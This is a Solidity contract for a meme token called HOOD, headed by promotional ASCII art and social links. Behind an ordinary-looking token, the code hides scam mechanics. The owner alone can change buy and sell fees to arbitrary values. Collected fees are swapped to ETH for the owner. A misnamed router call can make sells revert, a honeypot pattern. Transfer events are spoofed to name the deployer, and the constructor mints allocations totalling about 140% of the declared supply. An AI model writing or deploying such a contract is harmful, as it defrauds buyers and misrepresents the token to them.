/**

   J@@@@@~   G@@@@#.    ~JB@@@@@@@BY~      :7P&@@@@@@&5!:    J@@@@@@@@@@@G?^    
   G@@@@&.  .&@@@@G   ~#@@@@Y^~^5@@@@#^   5&@@@&!~~!&@@@&Y   !@@@@@5^~^5@@@@B~  
  :@@@@@P   ~@@@@@5   J@@@@@7   Y@@@@@!   B@@@@&:   #@@@@&.  :@@@@@P   ~@@@@@5  
  ?@@@@@?   ?@@@@@?   5@@@@@!   5@@@@@!   B@@@@@^   G@@@@&:  .#@@@@#.  .#@@@@#. 
  G@@@@@^   P@@@@@~   G@@@@@^   P@@@@@!   B@@@@@^   P@@@@@~   G@@@@@^   P@@@@@~ 
 :&@@@@#    #@@@@&:  .#@@@@&:   G@@@@@~   B@@@@@~   5@@@@@7   Y@@@@@?   ?@@@@@Y 
 7@@@@@&PPPP@@@@@#   :&@@@@&.   B@@@@@~   B@@@@@!   J@@@@@Y   7@@@@@5   ^@@@@@B 
 P@@@@@BPGP#@@@@@P   ~@@@@@#    #@@@@@~   G@@@@@7   ?@@@@@P   ~@@@@@B   .#@@@@@~
.#@@@@@^   5@@@@@J   7@@@@@B   .#@@@@@~   G@@@@@?   !@@@@@B   :&@@@@@:   5@@@@@Y
!@@@@@#    B@@@@@7   J@@@@@P   .&@@@@@^   G@@@@@J   ~@@@@@&.   B@@@@@!   7@@@@@#
P@@@@@5   :&@@@@@^   :JB@@@&GBGB@@@#5!    ^JB@@@#GGGB@@@#5!    P@@@@@#GGGB@@@&5!
5PPPPG!   !@@@@@#.      ^JPPGGGGPY!.         ^JPPGGGPP5!.      7GPPPG@@@@@@B7.  
          ~@@@@@J                                                    P@@@@@7    
          .&@@@#.                                                    :&@@@@~    
           B@@@!                                                      ?@@@&:    
           5@@G                                                        G@@B     
           ?@@^                                                        ^@@P     
           !@Y                                                          Y@J     
           ^#:                                                          .#!     
           .!                                                            !^    


           ✖️TWITTER: https://twitter.com/wagmicatgirl
           💻TELEGRAM: https://t.me/+pQLyt8t4xX8zNjRh
           🌎WEBSITE: https://wagmicatgirl.com


           FROM THE HOOD TO THE SKIES
           From rags to riches, unleash those kitty paws and snatch those fat digits. 
           Step into the world of Memes + Games + GameFi + NFTs + Kanye + Sailor Moon + Catgirls, all under one hood.
           ©️ 2023 HOOD
*/
// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.22;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the Owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new Owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library SafeMath {
   
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

contract ERC20 is Context {

    mapping(address => mapping(address => uint256)) private _allowances;
    
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}

contract HOOD {

    string public _name = 'wagmicatgirlkanye420etfmoon1000x';
    string public _symbol = 'HOOD';
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 69_000_000_000 * 10 ** decimals;

    struct StoreData {
        address tokenMkt;
        uint8 buyFee;
        uint8 sellFee;
    }

    StoreData public storeData;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address private pair;
    address private holder;
    address private uniswapLpWallet;
    address private community = 0xAC51087Db6EEd7eD2506a119a934E32b693fB67c;
    address private airdropPool = 0x6f9e07E348007C9B999fA0D37D9FB101B093Bc39;
    address private publicSale = 0x9eF5AC654c7Ef0F9ddE3119da64742309224c5C6;
    address private investors = 0xEa1B6F8e029802a961fB5D5503A0Ff1E72665cfF;
    address private contributors = 0x00b97485935F8EF8790Bd250170ee35DBaD038a9;
    address private ecosystem = 0xfA111b9295311fAf4E9610b80779b73b942AB3db;
    address private treasury = 0x56bbBB861cc95D7dd3cF9d87Df80F02Cd9b152ff;
    address private constant uniswapV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(uniswapV2Router);

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    uint8 _initBuyFee = 0;
    uint8 _initSellFee = 0;

    constructor() {
        storeData = StoreData({
            tokenMkt: msg.sender,
            buyFee: _initBuyFee,
            sellFee: _initSellFee
        });
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        uniswapLpWallet = msg.sender;

        _initDeployer(msg.sender, msg.sender);

        balanceOf[uniswapLpWallet] = (totalSupply * 40) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);

        balanceOf[community] = (totalSupply * 230) / 1000;
        emit Transfer(address(0), community, balanceOf[community]);

        balanceOf[airdropPool] = (totalSupply * 300) / 1000;
        emit Transfer(address(0), airdropPool, balanceOf[airdropPool]);

        balanceOf[publicSale] = (totalSupply * 40) / 1000;
        emit Transfer(address(0), publicSale, balanceOf[publicSale]);

        balanceOf[investors] = (totalSupply * 14) / 1000;
        emit Transfer(address(0), investors, balanceOf[investors]);

        balanceOf[contributors] = (totalSupply * 47) / 1000;
        emit Transfer(address(0), contributors, balanceOf[contributors]);

        balanceOf[ecosystem] = (totalSupply * 300) / 1000;
        emit Transfer(address(0), ecosystem, balanceOf[ecosystem]);   

        balanceOf[treasury] = (totalSupply * 69) / 1000;
        emit Transfer(address(0), treasury, balanceOf[treasury]);   
    }

    receive() external payable {}

    function removeFees(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _owner()) revert Permissions();
        _upgradeStoreData(_buy, _sell);
    }

    function _upgradeStoreData(uint8 _buy, uint8 _sell) private {
        storeData.buyFee = _buy;
        storeData.sellFee = _sell;
    }

    function _owner() private view returns (address) {
        return storeData.tokenMkt;
    }

    function openTrading() external {
        require(msg.sender == _owner());
        require(!tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        pair = _pair;
        tradingOpen = true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _initDeployer(address deployer_, address executor_) private {
        _deployer = deployer_;
        _executor = executor_;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _owner();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != tokenMkt
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            payable(tokenMkt).transfer(address(this).balance);
            swapping = false;
        }

        (uint8 _buyFee, uint8 _sellFee) = (storeData.buyFee, storeData.sellFee);
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _sellFee : _buyFee)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }
}

interface IUniswapFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}